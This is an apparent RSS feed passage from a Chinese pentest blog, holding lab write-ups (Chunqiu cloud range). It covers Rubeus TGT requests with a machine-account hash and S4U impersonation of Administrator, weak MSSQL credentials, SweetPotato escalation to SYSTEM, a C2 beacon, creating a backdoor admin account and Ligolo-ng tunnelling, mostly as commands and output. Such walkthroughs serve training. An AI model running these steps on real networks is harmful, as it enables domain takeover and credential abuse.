&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">C&lt;span class="p">:&lt;/span>&lt;span class="nl">\Users\test1\Desktop&lt;/span>&lt;span class="c1">&amp;gt;.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:4f4be8211219a166ed7d4db9f3ea90f1 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ______ _
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>_____ \ &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> _____&lt;span class="p">)&lt;/span> )_ _&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>__ _____ _ _ ___
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> __ /&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> _ \&lt;span class="p">|&lt;/span> ___ &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>/___)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> \ \&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>_) ) ____&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>___ &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>____/&lt;span class="p">|&lt;/span>____/&lt;span class="p">|&lt;/span>_____)____/(___/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.2.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] Action: Ask TGT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] Using rc4_hmac hash: ba19fde2ad1b06b123522cbadd28521c
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] Building AS-REQ (w/ preauth) for: &amp;#39;xiaorang.lab\MSSQLSERVER$&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] Using domain controller: 172.22.2.3:88
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[+] TGT request successful!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] base64(ticket.kirbi):
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE1TOiCBmHM2Ha6tp0uHeMQtXvcRO783PdU+aN6yn3uHivf0x9uoQTFr2PWHry5GmIc4FrtcR6dis3h4NgCFc2cZIK9AVW6rLRsgnQKHaAvDJNQyL89Yi+B7SrvWPwm+Fic0FyYmffV6WSsKubCu17Iwt17wvL88lqWqUBykz3h8xRXvzIK4vXpR4Yl7NLCBZXEA9lztqDuD0gbHjeQXm3U9pLxL+fLhUp87RQCWuhRXGHn+WfxeAlZMdIhrJdl5mf7QiUjlx5s+ydKMRh/CvUXR/9XOgt0TQNvnQLm68Wn/TOlQWVwA2PXO+W/bz6OqsQs/auGfmAwjfT67k/BJBOeoyReYlqo2WdDAYl3DJQocHNfteFCgU7/c9517zzbDDmzkPN6WEDOWJhRXLhhdvLiwLJguzESbTxe7c6DsMky2NLSL+w/z1229scI+eoRhWQFnm5kDPeoHcrEu2j4RsLcdLAAoo56ALr1+dINBeejDDER92J9YI4YByIV8XKGqe12Be/yj0UXVb7/0z4d0slY5tfCiIFbbhRIWrsiNitAEGdYypNOVGIJVgmNHRs5kjDnncaJq/B8cWIEHvvYvcG1BDlthCvSQ7uiDlv1uDvNjR+7Z7WvD1XhsoDNOlrwI6h/h/M1oNYx/5yGoQlNoj3dIq9/6jWtaghZW7hlCIbPX27AgLxbPUUrBGGXDlD/J/2iw2veboSYMPtuThiWY2juCKAIw397SbokXmV79HNFnKx4Dqq4wGvY9jLcYz/Zm594zks3mZuD2k3dB92ZEb2TYCNzKxMe+QFcyUkxg4BLLlhWlYlm4m/XxbyKoRfRE0VxW5yKffn9r7kKLkfHRBfnJ5qLDNz6LOjugUuPd8Dum6udKxCIuEUD7pENa6Qe9+1NUwGvuN0f5KWszsoIOZCv6hc//f+pQ1cFuExhv2XGR2+cYTRORZHkbUF+Wxgt9UWE2l3OhnzOT5S5xRp4n5OxjsTxzyLnJDvgPZR4BX9IbiNmF+Lbwt46SzDxhqqdgWRdchjUJYqbpEqE2rW/UqaeaumRgoVQX+v6qVQP6WKcZUIX3Idz2Y1T+xq/gqpnDysuIA18GlN3Yk4DVdBmi+YmfIQBCl2Dop8QYXdIpRpH4njvzsXqw+AyAG5uMIvFgsRh92hxkTPLW1HLJweZwKSrvnsc/hHql73Euix+QLwckgS2aKjmXkJNyT8bjvPO9N30dQ+CILbEwzS14umUWnv3si3kRk77c3pIzKdmVx18IrW6r7DZrSAbb/mfo8wIls4/pV/d6z7rCqREfO6/zS66PwVTM15DfUMRjQl26Y6mO66tnV7gOF9UYrhpd3/4xkEKXfyCX/KHMTienLKxdX67UACJjkMiWZD6LCCQxLto5nK8sXBB0srtLhYvxaFDSA0vtENnGKiLcMn87TPLbxtrTjeYsZhPjO6eOrJ/6zvcqmW8gw48ZIdatujgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBDxBbDHOspNBhHbGjmwKfZUoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDUxOTA3NDIwOFqmERgPMjAyNTA1MTkxNzQyMDhapxEYDzIwMjUwNTI2MDc0MjA4WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ServiceName : krbtgt/xiaorang.lab
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ServiceRealm : XIAORANG.LAB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> UserName : MSSQLSERVER$
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> UserRealm : XIAORANG.LAB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> StartTime : 2025/5/19 15:42:08
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> EndTime : 2025/5/20 1:42:08
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RenewTill : 2025/5/26 15:42:08
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Flags : name_canonicalize, pre_authent, initial, renewable, forwardable
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> KeyType : rc4_hmac
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Base64(key) : 8QWwxzrKTQYR2xo5sCn2VA==
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ASREP (key) : BA19FDE2AD1B06B123522CBADD28521C
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>再注入票据进行S4U攻击&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE0DbJuuq5Ria/zpevMDmrKCFPThuc66RXD9pTO38JXwSqw0zr2rE00SEJ3DcFS07mLk6NF80OnbIWri1GlYMeB4LRvz62xIAYJsfHTeGY/EuTMB94HdXiE6HnqftUHkK3Rknp8LgypfFDkpVm/TgjBrPnPL5Hnp33ovntmbn30g3J8x8ne5LHBVJnCQzwM5zG+Mq4TcU/THF8VYxpapAMCPUg1TwnzgFqOk7v8fTOPdqVHr1J9RmOxenVocAM04HDvGMlH3/1Z3d1eZt3JYkeuU+b0XzIWS1D2HK7x/uRPFBCtiUVuPb0YOCLTLEwW5PCF1gBUyfwLhshxB0NLacT1R+OQAp+gu8nSef/CrovPqxYMkFVmy6Db3/IH+gJhanCAQZMoGePBrJGAkVdZIz8dGZ6dXzqKMxy4t5sSv8AofwTqRoHwnw1GuRlJsEcUuemwTPVZNeHL4wBAa7G4lKKvClZKGcV4mnqou3Ow/DFu4tNTaZLcQfxOPQUN0TyTlXd/dkWEKvoFPjjRxCjuKL8WQ6+4aHtzTcJvd4a4BOXy3cAmgewYt2GVOwgqpyL0DK5wmsI/4uJoGk4iUrFICdJpxhQ0y/MhQAPhtLlRINLPoCCJLNRQ5cHq5qLHxqAqKeYrJxwpoLQaPKzUW5sMYyAeK8WK4kExyPBJaglQOQiVhzazK2LGs2Y25sE3nEMDhLoKOgHy1YPL0wn5BfUUHi0k4k25YdJt8HU48AW9rqzaovASOVuTasloYYRlxFxKlifYyEVaJGXykavY35sR2kQthghLgAZRaCUHuESM0beksOd5uRTL8lfi27tJ4GOJkNicns4gFP4gGBFX62DXOmk+3WjBcueFtqYmlLOjEqP+km3/NmnoJRPhvj0k3Qd7CGMhiRFbd4J9I2BcWNA3IYeFePr8NNPPvGMlbLzMtkpdR0wEuM8jCYR4jjDXqlVX71Z5fzCnMFrg/7pqnqQ+DZy7avDGgJ2rlOZffHEeOBNGHJBOHv1qihrxcXNis39R6gvtBbpWlDwG7WhvWaVR7i34neY9mGr+B202l3NucYGnJqBNONaugHY0wad+D/0cBZ+HG+sOBlIq5d/WvZAk6i2nG6MuVl7VcTURxtq9tOf48eC0XF2YMUTRJrjbEI1hD0yzkrGNIYp553jLgNwslYvf7/ndKbe1mPr4scYHgQLu9y/e8hs9rl3jru6kizB+CGTqhkMGSUrFzml7S3QEoufIx9DpjtmpksZqEQxsYXijbp/9Cn6NtGdxmm4O1VcHUr12VotESpaBQCGqaFFck0dnjt9LzkQOhQr3mbgoFHdSZevbItF/CAtx2eXW0wmciLOgVabZslEPWoFWeI9ZUqsMsvEEjXqXPJHiKc4KOokw9OeZIdVbPr91GOzIrAXMVv98XP42rGDohw60RcMA6OsaJeCh7IH3S6w0zGuu91ikcmIUsHMOWcP6IlkfXJVWjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBBznQz6kRyRh31/JiQ6BknfoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDYxODA1MzU1OFqmERgPMjAyNTA2MTgxNTM1NThapxEYDzIwMjUwNjI1MDUzNTU4WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>看起来太长了也可以直接一次性搞定，让他在内部申请TGT再直接完成S4U攻击&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">.\Rubeus.exe s4u /user:MSSQLSERVER$ /rc4:4f4be8211219a166ed7d4db9f3ea90f1 /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">type&lt;/span> \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>春秋云镜Tsclient</title><link>https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/</link><pubDate>Mon, 11 Aug 2025 16:47:31 +0000</pubDate><guid>https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/</guid><description>&lt;h2 id="flag1">flag1
&lt;/h2>&lt;p>&lt;a class="link" href="https://github.com/shadow1ng/fscan" target="_blank" rel="noopener"
>https://github.com/shadow1ng/fscan&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">./fscan -h 39.99.227.180 -p 1-65535
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>扫描出来mssql的弱密码&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">[+] mssql:39.99.227.180:1433:sa 1qaz!QAZ
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>使用MDUT链接 &lt;a class="link" href="https://github.com/SafeGroceryStore/MDUT/releases" target="_blank" rel="noopener"
>https://github.com/SafeGroceryStore/MDUT/releases&lt;/a> 要使用JDK8，我写了一个bat文件&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bat" data-lang="bat">&lt;span class="line">&lt;span class="cl">&lt;span class="p">@&lt;/span>&lt;span class="k">echo&lt;/span> off
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">rem 设置 Java 8 的路径&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">SET&lt;/span> &lt;span class="nv">JAVA8_JRE&lt;/span>&lt;span class="p">=&lt;/span>C:\Program Files\Java\jdk1.8.0_201\jre\bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">SET&lt;/span> &lt;span class="nv">JAVA8_JDK&lt;/span>&lt;span class="p">=&lt;/span>C:\Program Files\Java\jdk1.8.0_201\bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">rem 临时修改 PATH，使 Java 8 的 JDK 和 JRE 生效&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">SET&lt;/span> &lt;span class="nv">PATH&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nv">%JAVA8_JDK%&lt;/span>;&lt;span class="nv">%JAVA8_JRE%&lt;/span>;&lt;span class="nv">%PATH%&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">rem 运行 JAR 文件&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">java -jar Multiple.Database.Utilization.Tools-2.1.1-jar-with-dependencies.jar
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">rem 暂停以查看输出&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">pause&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/1.png"
width="740"
height="589"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/1_hu_56b101907daeafcb.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/1_hu_fe2d77861bc34413.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="125"
data-flex-basis="301px"
>&lt;/p>
&lt;p>链接之后激活组件，执行命令&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_15-41-22.png"
width="1483"
height="578"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_15-41-22_hu_b35e417f7ecc2403.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_15-41-22_hu_5fb039763b448a46.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="256"
data-flex-basis="615px"
>&lt;/p>
&lt;p>&lt;strong>SeImpersonatePrivilege&lt;/strong>权限可以使用甜土豆提权到SYSTEM， &lt;a class="link" href="https://github.com/uknowsec/SweetPotato" target="_blank" rel="noopener"
>https://github.com/uknowsec/SweetPotato&lt;/a> 上传上去 &lt;code>C:/Users/Public/SweetPotato.exe -a &amp;quot;whoami&amp;quot;&lt;/code>，为了方便管理，上线C2，新建一个监听器&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_15-37-18.png"
width="676"
height="647"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_15-37-18_hu_ab57ff5f59ec8f56.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_15-37-18_hu_d48be69f6b0eb61b.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="104"
data-flex-basis="250px"
>&lt;/p>
&lt;p>生成一个&lt;code>beacon.exe&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_15-38-34.png"
width="526"
height="293"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_15-38-34_hu_fdf339611dd2bc7.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_15-38-34_hu_302e8fd0ecaab67b.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="179"
data-flex-basis="430px"
>&lt;/p>
&lt;p>全部传上去之后运行&lt;code>C:/Users/Public/SweetPotato.exe -a &amp;quot;C:/Users/Public/beacon.exe&amp;quot;&lt;/code>成功上线&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_15-45-41.png"
width="2532"
height="495"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_15-45-41_hu_bbd6c95764385cbc.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_15-45-41_hu_b1661fe37b122b7.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="511"
data-flex-basis="1227px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">shell whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell &lt;span class="nb">type&lt;/span> C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\f&lt;/span>lag&lt;span class="se">\f&lt;/span>lag01.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>成功得到第一个 flag，新建一个用户到本地管理员，准备搭建代理&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">shell net user test1 baozongwi123! /add
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell net localgroup administrators test1 /add
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>使用Ligolo-ng &lt;a class="link" href="https://github.com/nicocha30/ligolo-ng/" target="_blank" rel="noopener"
>https://github.com/nicocha30/ligolo-ng/&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 入口机里面运行&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">start /B .&lt;span class="se">\a&lt;/span>gent.exe -bind 0.0.0.0:10010 &amp;gt; agent.log 2&amp;gt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># kali里面运行&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo ./proxy -selfcert -laddr &lt;span class="s2">&amp;#34;0.0.0.0:10001&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect_agent --ip 39.99.226.192:10010
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">interface_list
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">session
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">autoroute
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nohup ./gost -L&lt;span class="o">=&lt;/span>socks://:1080 &amp;gt; gost.log 2&amp;gt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">1&lt;/span> &lt;span class="p">&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 查看是否开启&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ss -luntp
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag2">flag2
&lt;/h2>&lt;p>利用fscan扫描内网机器存活&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>kali㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/桌面/Pentest/fscan&lt;span class="o">]&lt;/span>
